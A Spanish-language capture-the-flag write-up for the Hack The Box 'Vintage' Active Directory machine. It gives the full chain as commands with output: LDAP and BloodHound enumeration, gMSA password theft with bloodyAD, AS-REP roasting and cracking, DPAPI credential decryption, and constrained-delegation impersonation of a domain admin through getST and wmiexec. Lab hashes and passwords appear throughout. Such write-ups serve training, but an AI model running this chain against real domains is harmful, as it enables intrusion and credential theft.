en primer lugar lanzamos un 
nmap -p- -sV -Pn vintage.htb  -v  -sT  --min-rate 5000   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-26 11:43 CET
NSE: Loaded 46 scripts for scanning.
Initiating Connect Scan at 11:43
Scanning vintage.htb (10.10.11.45) [65535 ports]
Discovered open port 445/tcp on 10.10.11.45
Discovered open port 135/tcp on 10.10.11.45
Discovered open port 139/tcp on 10.10.11.45
Discovered open port 53/tcp on 10.10.11.45
Discovered open port 57939/tcp on 10.10.11.45
Discovered open port 636/tcp on 10.10.11.45
Discovered open port 389/tcp on 10.10.11.45
Discovered open port 88/tcp on 10.10.11.45
Discovered open port 49667/tcp on 10.10.11.45
Discovered open port 464/tcp on 10.10.11.45
Discovered open port 49664/tcp on 10.10.11.45
Discovered open port 3269/tcp on 10.10.11.45
Discovered open port 3268/tcp on 10.10.11.45
Discovered open port 9389/tcp on 10.10.11.45
Discovered open port 593/tcp on 10.10.11.45
Discovered open port 57918/tcp on 10.10.11.45
Discovered open port 49674/tcp on 10.10.11.45
Discovered open port 5985/tcp on 10.10.11.45
Discovered open port 57913/tcp on 10.10.11.45
Completed Connect Scan at 11:43, 26.32s elapsed (65535 total ports)
Initiating Service scan at 11:43
Scanning 19 services on vintage.htb (10.10.11.45)
Stats: 0:01:21 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 68.42% done; ETC: 11:45 (0:00:25 remaining)
Completed Service scan at 11:46, 143.49s elapsed (19 services on 1 host)
NSE: Script scanning 10.10.11.45.
Initiating NSE at 11:46
Completed NSE at 11:46, 0.21s elapsed
Initiating NSE at 11:46
Completed NSE at 11:46, 1.04s elapsed
Nmap scan report for vintage.htb (10.10.11.45)
Host is up (0.043s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-26 10:44:06Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
57913/tcp open  msrpc         Microsoft Windows RPC
57918/tcp open  msrpc         Microsoft Windows RPC
57939/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows



Se encuentra que en la línea del puerto 3269, hay un host de control de dominio llamado: DC01, que se agrega a /etc/hosts

Y hay un servidor ldap en 3268, así como un servicio Kerberos y un servicio 5985winrm.

continuamos con 

ldapsearch -x -H ldap://10.10.11.45 -D "P.Rosa@vintage.htb" -w "Rosaisbest123" -b "DC=vintage,DC=htb" "(objectClass=user)" sAMAccountName memberOf

memberOf
# extended LDIF
#
# LDAPv3
# base <DC=vintage,DC=htb> with scope subtree
# filter: (objectClass=user)
# requesting: sAMAccountName memberOf 
#

# Administrator, Users, vintage.htb
dn: CN=Administrator,CN=Users,DC=vintage,DC=htb
memberOf: CN=Group Policy Creator Owners,CN=Users,DC=vintage,DC=htb
memberOf: CN=Domain Admins,CN=Users,DC=vintage,DC=htb
memberOf: CN=Enterprise Admins,CN=Users,DC=vintage,DC=htb
memberOf: CN=Schema Admins,CN=Users,DC=vintage,DC=htb
memberOf: CN=Administrators,CN=Builtin,DC=vintage,DC=htb
sAMAccountName: Administrator

# Guest, Users, vintage.htb
dn: CN=Guest,CN=Users,DC=vintage,DC=htb
memberOf: CN=Guests,CN=Builtin,DC=vintage,DC=htb
sAMAccountName: Guest

# DC01, Domain Controllers, vintage.htb
dn: CN=DC01,OU=Domain Controllers,DC=vintage,DC=htb
sAMAccountName: DC01$

# krbtgt, Users, vintage.htb
dn: CN=krbtgt,CN=Users,DC=vintage,DC=htb
memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=vintage,DC=htb
sAMAccountName: krbtgt

# gMSA01, Managed Service Accounts, vintage.htb
dn: CN=gMSA01,CN=Managed Service Accounts,DC=vintage,DC=htb
sAMAccountName: gMSA01$

# fs01, Computers, vintage.htb
dn: CN=fs01,CN=Computers,DC=vintage,DC=htb
memberOf: CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=vintage,DC=htb
sAMAccountName: FS01$

# M.Rossi, Users, vintage.htb
dn: CN=M.Rossi,CN=Users,DC=vintage,DC=htb
sAMAccountName: M.Rossi

# R.Verdi, Users, vintage.htb
dn: CN=R.Verdi,CN=Users,DC=vintage,DC=htb
sAMAccountName: R.Verdi

# L.Bianchi, Users, vintage.htb
dn: CN=L.Bianchi,CN=Users,DC=vintage,DC=htb
memberOf: CN=ServiceManagers,OU=Pre-Migration,DC=vintage,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=vintage,DC=htb
sAMAccountName: L.Bianchi

# G.Viola, Users, vintage.htb
dn: CN=G.Viola,CN=Users,DC=vintage,DC=htb
memberOf: CN=ServiceManagers,OU=Pre-Migration,DC=vintage,DC=htb
sAMAccountName: G.Viola

# C.Neri, Users, vintage.htb
dn: CN=C.Neri,CN=Users,DC=vintage,DC=htb
memberOf: CN=ServiceManagers,OU=Pre-Migration,DC=vintage,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=vintage,DC=htb
sAMAccountName: C.Neri

# P.Rosa, Users, vintage.htb
dn: CN=P.Rosa,CN=Users,DC=vintage,DC=htb
sAMAccountName: P.Rosa

# svc_sql, Pre-Migration, vintage.htb
dn: CN=svc_sql,OU=Pre-Migration,DC=vintage,DC=htb
memberOf: CN=ServiceAccounts,OU=Pre-Migration,DC=vintage,DC=htb
sAMAccountName: svc_sql

# svc_ldap, Pre-Migration, vintage.htb
dn: CN=svc_ldap,OU=Pre-Migration,DC=vintage,DC=htb
memberOf: CN=ServiceAccounts,OU=Pre-Migration,DC=vintage,DC=htb
sAMAccountName: svc_ldap

# svc_ark, Pre-Migration, vintage.htb
dn: CN=svc_ark,OU=Pre-Migration,DC=vintage,DC=htb
memberOf: CN=ServiceAccounts,OU=Pre-Migration,DC=vintage,DC=htb
sAMAccountName: svc_ark

# C.Neri_adm, Users, vintage.htb
dn: CN=C.Neri_adm,CN=Users,DC=vintage,DC=htb
memberOf: CN=DelegatedAdmins,OU=Pre-Migration,DC=vintage,DC=htb
memberOf: CN=Remote Desktop Users,CN=Builtin,DC=vintage,DC=htb
sAMAccountName: C.Neri_adm

# L.Bianchi_adm, Users, vintage.htb
dn: CN=L.Bianchi_adm,CN=Users,DC=vintage,DC=htb
memberOf: CN=DelegatedAdmins,OU=Pre-Migration,DC=vintage,DC=htb
memberOf: CN=Domain Admins,CN=Users,DC=vintage,DC=htb
sAMAccountName: L.Bianchi_adm

# search reference
ref: ldap://ForestDnsZones.vintage.htb/DC=ForestDnsZones,DC=vintage,DC=htb

# search reference
ref: ldap://DomainDnsZones.vintage.htb/DC=DomainDnsZones,DC=vintage,DC=htb

# search reference
ref: ldap://vintage.htb/CN=Configuration,DC=vintage,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 21
# numEntries: 17
# numReferences: 3


Explicación de cada parte.

    ldapsearch: Esta es una herramienta de línea de comandos para consultar directorios LDAP.
    -x: Indica utilizar autenticación simple en lugar de autenticación SASL.
    -H ldap://<IP>: Especifique la dirección del servidor LDAP (reemplácela con la dirección IP real <IP>).
    -D "P.Rosa@vintage.htb": DN vinculante (nombre distinguido), que es la credencial de usuario utilizada para iniciar sesión en el servidor LDAP.
    -w "Rosaisbest123": Especifique la contraseña del usuario vinculado.
    -b "DC=vintage,DC=htb": Especifique el DN base de la búsqueda (Base DN), es decir, el nodo desde el que comenzar a buscar en el directorio LDAP.
    "(objectClass=user)": Este es un filtro que especifica que solo userse consulten las entradas con clase de objeto.
    sAMAccountName memberOf: Especifica las propiedades que se devolverán. sAMAccountNameEs el nombre de inicio de sesión del usuario e memberOfindica el grupo al que pertenece el usuario.

Utilice la información de usuario proporcionada en la pregunta para realizar el inicio de sesión remoto ldap y enumerar los usuarios y grupos en el dominio.

Hay una computadora con el nombre de dominio. FS01.vintage.htb.Parece ser esta máquin

modificamos el /etc/resolv.conf
#nameserver 192.168.xxx.xxx
nameserver 10.10.11.45

tenemos que poner # a todos los previos.

cambiamos la hora para sincronizarla con kerberos

ntpdate dc01.vintage.htb

2024-12-26 12:18:25.319966 (+0100) +0.732592 +/- 0.018839 dc01.vintage.htb 10.10.11.45 s1 no-leap
CLOCK: time stepped by 0.732592

ahora lanzamos el bloodhound-python para recopilar informacion

bloodhound-python -c All -u P.Rosa -p 'Rosaisbest123' -d vintage.htb -ns 10.10.11.45      
INFO: Found AD domain: vintage.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.vintage.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc01.vintage.htb
INFO: Found 16 users
INFO: Found 58 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: FS01.vintage.htb
INFO: Querying computer: dc01.vintage.htb
WARNING: Could not resolve: FS01.vintage.htb: The resolution lifetime expired after 3.102 seconds: Server Do53:10.10.11.45@53 answered The DNS operation timed out.
INFO: Done in 00M 10S


20241226122611_computers.json   20241226122611_domains.json  20241226122611_groups.json  20241226122611_users.json
20241226122611_containers.json  20241226122611_gpos.json     20241226122611_ous.json 

levantamos el servidor de bloodhound con

sudo neo4j console

y accedemos por http://localhost:7474
no hacemos nada ahi , y entramos por bloodhound, usando neo4j de user y pass.

Dentro del bloodhound le damos a import data y pasamos todos los .json

Se puede encontrar L.BIANCHI_ADM@VINTAGE.HTBque está en el grupo de administradores de dominio y tiene derechos de administrador.

y GMSA01$@VINTAGE.HTBpuede agregarse al grupo de Administradores

De FS01 a GMSA01, puede ver que FS01 puede leer la contraseña de GMS

Luego, GMS puede agregarse al grupo de administradores.


Utilice GetTGT.py: proporcione contraseña, hash o clave aes para solicitar TGT y guárdelo en formato ccache

KRB5CCNAMEEstablezca la variable de entorno FS01\$.ccachepara especificar el archivo de caché que los clientes Kerberos deben usar.

export KRB5CCNAME=FS01\$.ccache

GMSA01$Utilice bloodyAD para interactuar con Active Directory, a través de la autenticación Kerberos, para obtener la contraseña de la cuenta de servicio administrada denominada (almacenada en msDS-ManagedPasswordel atributo) del controlador de dominio de Active Directory especificado.

bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k get object 'GMSA01$' --attr msDS-ManagedPassword

distinguishedName: CN=gMSA01,CN=Managed Service Accounts,DC=vintage,DC=htb
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:a317f224b45046c1446372c4dc06ae53
msDS-ManagedPassword.B64ENCODED: rbqGzqVFdvxykdQOfIBbURV60BZIq0uuTGQhrt7I1TyP2RA/oEHtUj9GrQGAFahc5XjLHb9RimLD5YXWsF5OiNgZ5SeBM+WrdQIkQPsnm/wZa/GKMx+m6zYXNknGo8teRnCxCinuh22f0Hi6pwpoycKKBWtXin4n8WQXF7gDyGG6l23O9mrmJCFNlGyQ2+75Z1C6DD0jp29nn6WoDq3nhWhv9BdZRkQ7nOkxDU0bFOOKYnSXWMM7SkaXA9S3TQPz86bV9BwYmB/6EfGJd2eHp5wijyIFG4/A+n7iHBfVFcZDN3LhvTKcnnBy5nihhtrMsYh2UMSSN9KEAVQBOAw12g==

Intente obtener un ticket de Kerberos de un controlador de dominio de Active Directory utilizando un hash de cuenta GMSA conocido

python3 getTGT.py vintage.htb/GMSA01$ -hashes aad3b435b51404eeaad3b435b51404ee:a317f224b45046c1446372c4dc06ae53 
Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in GMSA01$.ccache

importante:
export KRB5CCNAME=GMSA01\$.ccache 

Luego agregue P.Rosa a SERVICEMANAGERS, use las credenciales de GMSA y luego genere sus propias credenciales.

bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k add groupMember "SERVICEMANAGERS" "P.Rosa"
[+] P.Rosa added to SERVICEMANAGERS

sacamos el tiquet de nuevo
python3 getTGT.py vintage.htb/P.Rosa:Rosaisbest123 -dc-ip dc01.vintage.htb                                     
Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in P.Rosa.ccache

export KRB5CCNAME=P.Rosa.ccache

Buscamos usuarios


ldapsearch -x -H ldap://10.10.11.45 -D "P.Rosa@vintage.htb" -w "Rosaisbest123" -b "DC=vintage,DC=htb" "(objectClass=user)" sAMAccountName | grep "sAMAccountName:" | cut -d " " -f 2 > usernames.txt 

cat usernames.txt
Administrator
Guest
DC01$
krbtgt
gMSA01$
FS01$
M.Rossi
R.Verdi
L.Bianchi
G.Viola
C.Neri
P.Rosa
svc_sql
svc_ldap
svc_ark
C.Neri_adm
L.Bianchi_adm

Luego use impact-GetNPUsers para enumerar los usuarios que no requieren autenticación de dominio Kerberos (UF_DONT_REQUIRE_PREAUTH)

python3 GetNPUsers.py -dc-ip 10.10.11.45 -request -usersfile usernames.txt vintage.htb/
Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 

/home/shat/Desktop/HTB/Vintage/venv/bin/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User DC01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User gMSA01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User FS01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User M.Rossi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User R.Verdi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User L.Bianchi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User G.Viola doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User C.Neri doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User P.Rosa doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User svc_ldap doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc_ark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User C.Neri_adm doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User L.Bianchi_adm doesn't have UF_DONT_REQUIRE_PREAUTH set


Siguiente deshabilitar la autenticación previa

bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k add uac SVC_ARK -f DONT_REQ_PREAUTH
[-] ['DONT_REQ_PREAUTH'] property flags added to SVC_ARK's userAccountControl

bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k add uac SVC_LDAP -f DONT_REQ_PREAUTH  
[-] ['DONT_REQ_PREAUTH'] property flags added to SVC_LDAP's userAccountControl

bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k add uac SVC_SQL -f DONT_REQ_PREAUTH 
[-] ['DONT_REQ_PREAUTH'] property flags added to SVC_SQL's userAccountControl


activar cuentas

bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k remove uac SVC_ARK -f ACCOUNTDISABLE
[-] ['ACCOUNTDISABLE'] property flags removed from SVC_ARK's userAccountControl

bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k remove uac SVC_LDAP -f ACCOUNTDISABLE   
[-] ['ACCOUNTDISABLE'] property flags removed from SVC_LDAP's userAccountControl

bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k remove uac SVC_SQL -f ACCOUNTDISABLE 
[-] ['ACCOUNTDISABLE'] property flags removed from SVC_SQL's userAccountControl

Verifique los usuarios del dominio nuevamente

python3 GetNPUsers.py -dc-ip 10.10.11.45 -request -usersfile usernames.txt vintage.htb/ 
Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 

/home/shat/Desktop/HTB/Vintage/venv/bin/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User DC01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User gMSA01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User FS01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User M.Rossi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User R.Verdi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User L.Bianchi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User G.Viola doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User C.Neri doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User P.Rosa doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc_sql@VINTAGE.HTB:38d2826b3dd0c580e04922c9f3229670$0ae1a3799659e364ff338acabae26a15bea0c015ed1ca5c075810a568394787bb887507135a51352b4af63fbf7498842da8259390e74c271b89acb64b327eeb368c6aadaabf17c9bad92ae3bcc50aca18cd029d1e53a088487fb71f8d2f6818368aecfa8f3055795eea082b36fa123bae6ecdf1998ce01e53360f310e14b633ad7fbbb094255d8b938864941b90e33e1dbc55b9c5a9f8765d0d0272a1f91863d40e307ad501aeda77601090bd37c2446fa30392f40356f4a800a36c21384cfcfb8da1d38b30a479afbddb3613d23871b945809223840c05083db4cf855677fcdc3764f2eb1fa10bee4e8
$krb5asrep$23$svc_ldap@VINTAGE.HTB:7cfc5a311c046dac98ea02eb34e43ca5$8ad3a28feb532ee73fa8ea0be81fc36151f177c26acb9e8292428490bdd946f8e74f37e02a60815d8a8b0751579c136c21dc173a34fb9896dde4f78d14392717c0b5a64b2f67523f5681d44a441281195e5a8a41b569c76cb3ed3147aab71616cee6ef6973b2a9ac0bf5c982aa8cdba0ef6d72519f81ae3a24398dcbdbdd69a5d79452315f8618e7398573e9c4cb0c21141839680917b5b60390f71e301e0961f3412d9b7da276a105f1b41c22210da233ba41e2771888f0f56b56081028db8f50a66bd6475d0918bd759048163aea680e46fd0b6e32790a27bf5429ef58330b22c097ad4ab1f1f5ad4d
$krb5asrep$23$svc_ark@VINTAGE.HTB:b960f8847b8c5ec9598b9670dee6c36a$c9c1425f3f40177358b567697cac08ed5b379eb1d867248404b8794ef25ef4dbb960c9cd9098e0819335fa3adfae3cfa393cfc404354a0d106f6815baa5d2ae86bf47a6fa9cde801c5bca64515028a6b07a64ff012842ed590dbfc53a5c6e977f5ebd4faed72e5fdbcb61b103ef12673c7b8d93a797c82dd8db1527140f48053b9eff7132228b36c21035f14be0e3ff77ecccbd9375b9d9c5020d6aa677e673b1816915bcc6a6191142233e7a186d8fae21d5d46ac1fcfc08fa8d513de16a5927fdf6f71c13cc3ee7382f30d478e663e4ad88bf16682c45adc648f80988e459589c3a2a7109da29ff1c4
[-] User C.Neri_adm doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User L.Bianchi_adm doesn't have UF_DONT_REQUIRE_PREAUTH set


Le pasamos john al primer hash, de svc_sql y obtenemos Zer0the0ne como password.

Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 512/512 AVX512BW 16x])
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Zer0the0ne       ($krb5asrep$23$svc_sql@VINTAGE.HTB)     
1g 0:00:00:01 DONE (2024-12-26 13:28) 0.9174g/s 954480p/s 954480c/s 954480C/s alexliam..TEGLUSH4EVA
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

probamos

C.Neri@vintage.htbContraseña de uso de cuenta Zer0the0neIngresó exitosamente

Obtenga las credenciales para esta cuenta

python3 getTGT.py vintage.htb/c.neri:Zer0the0ne -dc-ip vintage.htb

export KRB5CCNAME=c.neri.ccache

Luego inicie sesión de forma remota utilizando el puerto 5985

evil-winrm -i dc01.vintage.htb -r vintage.htb

y estamos dentro

obtenemos la user.txt

en C:\Users\C.Neri\Desktop

Aquí usamos DPAPI para obtener credenciales de identidad de Windows.

*Evil-WinRM* PS C:\users\c.neri\appdata\roaming\microsoft\credentials> dir -h


    Directory: C:\users\c.neri\appdata\roaming\microsoft\credentials


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          6/7/2024   5:08 PM            430 C4BB96844A5C9DD45D5B6A9859252BA6


download C4BB96844A5C9DD45D5B6A9859252BA6


*Evil-WinRM* PS C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115> dir -h


    Directory: C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          6/7/2024   1:17 PM            740 4dbf04d8-529b-4b4c-b4ae-8e875e4fe847
-a-hs-          6/7/2024   1:17 PM            740 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
-a-hs-          6/7/2024   1:17 PM            904 BK-VINTAGE
-a-hs-          6/7/2024   1:17 PM             24 Preferred

download 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b





python3 dpapi.py masterkey -file 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b -sid S-1-5-21-4024337825-2033394866-2055507597-1115 -password Zer0the0ne
Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a





python3 dpapi.py credential -file C4BB96844A5C9DD45D5B6A9859252BA6 -key 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a
Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2024-06-07 15:08:23
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000001 (CRED_TYPE_GENERIC)
Target      : LegacyGeneric:target=admin_acc
Description : 
Unknown     : 
Username    : vintage\c.neri_adm
Unknown     : Uncr4ck4bl3P4ssW0rd0312


ahora tenemos contraseña para c.neri_adm


ahora agregamos a c.neri_adm a DELEGATEADMINS

bloodyAD --host dc01.vintage.htb --dc-ip 10.10.11.45 -d "VINTAGE.HTB" -u c.neri_adm -p 'Uncr4ck4bl3P4ssW0rd0312' -k add groupMember "DELEGATEDADMINS" "SVC_SQL"
[+] SVC_SQL added to DELEGATEDADMINS

python3 getTGT.py vintage.htb/c.neri:Zer0the0ne -dc-ip dc01.vintage.htb                                                    
Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in c.neri.ccache

export KRB5CCNAME=c.neri.ccache 


bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k set object "SVC_SQL" servicePrincipalName  -v "cifs/fake"
[+] SVC_SQL's servicePrincipalName has been updated.

ahora desde dentro de la sesion de c_neri activaremos la cuenta, que en mi caso se ha desactivado

*Evil-WinRM* PS C:\Users\C.Neri\Documents> Get-ADUser -Identity svc_sql -Properties Enabled, LockedOut


DistinguishedName : CN=svc_sql,OU=Pre-Migration,DC=vintage,DC=htb
Enabled           : False
GivenName         :
LockedOut         : False
Name              : svc_sql
ObjectClass       : user
ObjectGUID        : 3fb41501-6742-4258-bfbe-602c3a8aa543
SamAccountName    : svc_sql
SID               : S-1-5-21-4024337825-2033394866-2055507597-1134
Surname           :
UserPrincipalName :



*Evil-WinRM* PS C:\Users\C.Neri\Documents> Enable-ADAccount -Identity svc_sql
*Evil-WinRM* PS C:\Users\C.Neri\Documents> Get-ADUser -Identity svc_sql -Properties ServicePrincipalName


DistinguishedName    : CN=svc_sql,OU=Pre-Migration,DC=vintage,DC=htb
Enabled              : True
GivenName            :
Name                 : svc_sql
ObjectClass          : user
ObjectGUID           : 3fb41501-6742-4258-bfbe-602c3a8aa543
SamAccountName       : svc_sql
ServicePrincipalName : {cifs/fake}
SID                  : S-1-5-21-4024337825-2033394866-2055507597-1134
Surname              :
UserPrincipalName    :


python3 getTGT.py vintage.htb/svc_sql:Zer0the0ne -dc-ip dc01.vintage.htb

Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in svc_sql.ccache

conseguimos el TGT

export KRB5CCNAME=svc_sql.ccache

Suplantar al usuario L.BIANCHI_ADM para solicitar cifs/dc01.vintage.htbun ticket de servicio para el servicio. Después de obtener exitosamente el ticket, podrás utilizarlo para acceder al servicio.


python3 getST.py -spn 'cifs/dc01.vintage.htb' -impersonate L.BIANCHI_ADM -dc-ip 10.10.11.45 -k 'vintage.htb/svc_sql:Zer0the0ne'
Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating L.BIANCHI_ADM
/home/shat/Desktop/HTB/Vintage/venv/bin/getST.py:380: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow()
/home/shat/Desktop/HTB/Vintage/venv/bin/getST.py:477: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[*] Requesting S4U2self
/home/shat/Desktop/HTB/Vintage/venv/bin/getST.py:607: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow()
/home/shat/Desktop/HTB/Vintage/venv/bin/getST.py:659: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[*] Requesting S4U2Proxy
[*] Saving ticket in L.BIANCHI_ADM@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache


export KRB5CCNAME=L.BIANCHI_ADM@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache


impacket-wmiexec -k -no-pass VINTAGE.HTB/L.BIANCHI_ADM@dc01.vintage.htb 
Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
vintage\l.bianchi_adm

C:\>cd /users/administrator/desktop
C:\users\administrator\desktop>type root.txt

y asi conseguimos la root flag
